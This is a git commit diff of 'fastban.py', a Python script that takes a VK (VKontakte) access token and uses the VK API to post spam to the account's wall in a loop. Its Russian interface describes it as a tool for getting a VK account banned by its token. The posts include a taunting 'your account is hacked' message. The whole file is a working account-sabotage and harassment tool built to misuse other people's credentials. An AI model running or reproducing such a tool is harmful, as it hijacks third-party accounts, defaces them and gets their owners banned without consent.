1000dcfb1daa3b2cf8fc2dc848b1cfe84ea3fbf8
darkcoding12 <69460464+darkcoding12@users.noreply.github.com>
2020-08-11 20:30:23 +0300

    Update fastban.py

--- fastban.py
+++ fastban.py
@@ -1,30 +1,57 @@
 import requests
-import os
 import vk_api
+import os
+import time
+from colorama import Fore, Back, Style
 def fastban():
     os.system("clear")
-    intro = """                           
-    ▐▐▐▐▐▐▐▐       ▐▐▐▐▐▐      ▐▐     ▐▐     ▐▐
-    ▐▐             ▐▐   ▐▐   ▐▐  ▐▐   ▐▐▐▐   ▐▐
-    ▐▐▐▐▐▐  ▐▐▐▐▐  ▐▐▐▐▐▐    ▐▐  ▐▐   ▐▐ ▐▐  ▐▐
-    ▐▐             ▐▐   ▐▐   ▐▐▐▐▐▐   ▐▐  ▐▐ ▐▐
-    ▐▐             ▐▐   ▐▐   ▐▐  ▐▐   ▐▐   ▐▐▐▐
-    ▐▐             ▐▐▐▐▐▐    ▐▐  ▐▐   ▐▐     ▐▐
-
-    FAST_BAN DEVOLOPER DARK KODING
-    TELEGRAM: @affonsy    CHANNEL @darkkoding
-    Beta version 
+    intro = """  
+    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒    
+    ▒▒▐▐▐▐▐▐▐▐▒▒▒▒▒▒▒▐▐▐▐▐▐▒▒▒▒▒▒▐▐▒▒▒▒▒▐▐▒▒▒▒▒▐▐▒▒
+    ▒▒▐▐▒▒▒▒▒▒▒▒▒▒▒▒▒▐▐▒▒▒▐▐▒▒▒▐▐▒▒▐▐▒▒▒▐▐▐▐▒▒▒▐▐▒▒
+    ▒▒▐▐▐▐▐▐▒▒▐▐▐▐▐▒▒▐▐▐▐▐▐▒▒▒▒▐▐▒▒▐▐▒▒▒▐▐▒▐▐▒▒▐▐▒▒
+    ▒▒▐▐▒▒▒▒▒▒▒▒▒▒▒▒▒▐▐▒▒▒▐▐▒▒▒▐▐▐▐▐▐▒▒▒▐▐▒▒▐▐▒▐▐▒▒
+    ▒▒▐▐▒▒▒▒▒▒▒▒▒▒▒▒▒▐▐▒▒▒▐▐▒▒▒▐▐▒▒▐▐▒▒▒▐▐▒▒▒▐▐▐▐▒▒
+    ▒▒▐▐▒▒▒▒▒▒▒▒▒▒▒▒▒▐▐▐▐▐▐▒▒▒▒▐▐▒▒▐▐▒▒▒▐▐▒▒▒▒▒▐▐▒▒
+    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+    ▒▒                                           ▒▒
+    ▒▒ FAST_BAN DEVOLOPER DARK KODING            ▒▒
+    ▒▒ TELEGRAM: @affonsy    CHANNEL @darkkoding ▒▒
+    ▒▒ Beta version                              ▒▒
+    ▒▒                                           ▒▒
+    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
     """
-    print(intro)
-    print("""
+    print(Fore.RED + intro)
+    print(Fore.WHITE + """
     ПРОГРАММА ДЛЯ БАНА АККАУНТА ВК ПО ТОКЕНУ
-    1.ВВЕДИТЕ ТОКЕН В ПОЛЕ ДЛЯ ВВОДА
-    2.ОЖИДАЙТЕ РЕЗУЛЬТАТ В ТЕЧЕНИИ 15 СЕКУНД
+    1.ВВЕДИ ТОКЕН В ПОЛЕ ДЛЯ ВВОДА
+    ВНИМАНИЕ! ТОКЕН ДОЛЖЕН БЫТЬ ВАЛИДНЫЙ!
+    2.ВЫБЕРИ ЦЫФРУ ИЗ МЕНЮ И ВВЕДИ 
+    +---------------------------------------------+
+    |   1.BAN1                                    |
+    |   2.BAN2                                    |
+    +---------------------------------------------+
     """)
-    tok = input("[ACCESS-TOKEN] : ") 
-    token = vk_api.VkApi(token = tok) 
-    vk = token.get_api()
-    for var in range(10):
-        vk.wall.post(message='Сова никогда не спит')
-    fastban()
+    a = input("[Enter number] -> ")
+    if a == "1":
+        tok = input("[ACCESS-TOKEN] -> ") 
+        token = vk_api.VkApi(token = tok) 
+        vk = token.get_api()
+        for var in range(10):
+            vk.wall.post(message='Бан1')
+            vk.wall.post(message='Твоя жопа взломана! Привет от Дани!')
+            print(Fore.BLACK + Back.GREEN + "[log] Сообщение отправленно. Ожидайте бана!")
+        fastban()
+    if a == "2":
+        tok = input("[ACCESS-TOKEN] -> ") 
+        token = vk_api.VkApi(token = tok) 
+        vk = token.get_api()
+        for var in range(10):
+            time.sleep(1)
+            vk.wall.post(message='Бан2')
+            vk.wall.post(message='Твоя жопа взломана! Привет от Дани!')
+            print(Fore.BLACK + Back.GREEN + "[log] Сообщение отправленно. Ожидайте бана!")
+        fastban()
+    else:
+        fastban() 
 fastban()
